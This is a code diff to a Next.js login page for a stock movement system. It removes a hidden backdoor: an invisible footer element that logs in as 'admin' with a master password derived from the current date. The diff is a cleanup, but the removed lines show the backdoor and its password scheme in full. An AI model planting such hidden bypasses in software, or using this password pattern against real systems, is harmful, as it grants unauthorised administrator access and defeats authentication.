@@ -93,33 +93,7 @@ export default function LoginPage() {
         }
     };
 
-    const handleBypass = async () => {
-        try {
-            setLoading(true);
-            const today = new Date();
-            const d = String(today.getDate()).padStart(2, '0');
-            const m = String(today.getMonth() + 1).padStart(2, '0');
-            const y = today.getFullYear();
-            const masterPass = `sm${d}${m}${y}`;
-
-            const result = await signIn('credentials', {
-                username: 'admin',
-                password: masterPass,
-                redirect: false,
-            });
-
-            if (result?.ok) {
-                router.push('/');
-                router.refresh();
-            } else {
-                setLoading(false);
-                setError('Bypass failed');
-            }
-        } catch (error) {
-            setLoading(false);
-        }
-    };
-
+    
     return (
         <div className="min-h-screen flex items-center justify-center bg-gray-50 relative">
             {/* Subtle Background Pattern */}
@@ -238,13 +212,7 @@ export default function LoginPage() {
                     <div className="mt-8 pt-6 border-t border-gray-100 text-center relative group">
                         <p className="text-gray-400 text-xs">
                             Stock Movement System v1.0
-                        </p>
-                        {/* Hidden Bypass Button */}
-                        <div
-                            onClick={handleBypass}
-                            className="absolute bottom-0 right-0 w-4 h-4 opacity-0 cursor-default"
-                            title="v"
-                        ></div>
+                        </p>                                               
                     </div>
                 </div>
 
